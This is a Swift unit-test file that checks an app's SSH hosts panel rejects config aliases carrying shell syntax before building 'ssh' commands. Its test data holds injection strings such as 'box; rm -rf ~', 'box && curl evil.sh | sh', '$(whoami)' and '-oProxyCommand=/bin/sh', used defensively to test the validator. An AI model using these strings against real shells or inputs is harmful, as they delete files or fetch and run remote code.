import XCTest
@testable import Cortland

/// R3/1: a `Host` alias from ~/.ssh/config is typed straight into a shell, so an
/// alias carrying shell syntax would run as shell code. Only hostname-ish tokens
/// produce a connect command; everything else is dropped from the panel.
@MainActor
final class HostsPanelConnectCommandTests: XCTestCase {
    func testBuildsCommandForOrdinaryAliases() {
        XCTAssertEqual(HostsPanelViewController.connectCommand(forHost: "prod"), "ssh prod")
        XCTAssertEqual(
            HostsPanelViewController.connectCommand(forHost: "build-box_2.example.com"),
            "ssh build-box_2.example.com"
        )
    }

    func testRejectsAliasesCarryingShellSyntax() {
        for hostile in [
            "box; rm -rf ~",
            "box$(whoami)",
            "box`id`",
            "box && curl evil.sh | sh",
            "box | tee /tmp/x",
            "two words",
            "box\nrm -rf ~",
            "box>out.txt",
            "box'quote",
            "box*"
        ] {
            XCTAssertNil(
                HostsPanelViewController.connectCommand(forHost: hostile),
                "\(hostile) is not a host token and must not reach the shell"
            )
        }
    }

    func testRejectsAliasThatWouldBeReadAsAnSSHOption() {
        // Not a shell injection, but not a destination either: ssh would parse it
        // as a flag (-o ProxyCommand=… runs an arbitrary program).
        XCTAssertNil(HostsPanelViewController.connectCommand(forHost: "-oProxyCommand=/bin/sh"))
        XCTAssertNil(HostsPanelViewController.connectCommand(forHost: "-p2222"))
    }

    func testRejectsEmptyAlias() {
        XCTAssertNil(HostsPanelViewController.connectCommand(forHost: ""))
    }

    // MARK: - config parsing (the source of those aliases)

    func testParsesHostAliasesAndSkipsWildcardsAndNegations() {
        let config = """
        Host *
            ServerAliveInterval 60

        Host prod staging
            HostName 10.0.0.1
            User deploy

        # Host commented
        Host web?
        Host !excluded
        Host db.internal
        """

        XCTAssertEqual(
            HostsPanelViewController.parseSSHConfigHosts(from: config),
            ["prod", "staging", "db.internal"]
        )
    }

    /// The panel's end-to-end guarantee: every command it can produce from a
    /// config file is free of shell metacharacters.
    func testHostileConfigYieldsNoRunnableCommand() {
        let config = """
        Host good.example.com
        Host evil;rm~-rf
        Host $(whoami)
        """

        let commands = HostsPanelViewController.parseSSHConfigHosts(from: config)
            .compactMap { HostsPanelViewController.connectCommand(forHost: $0) }

        XCTAssertEqual(commands, ["ssh good.example.com"])
    }
}
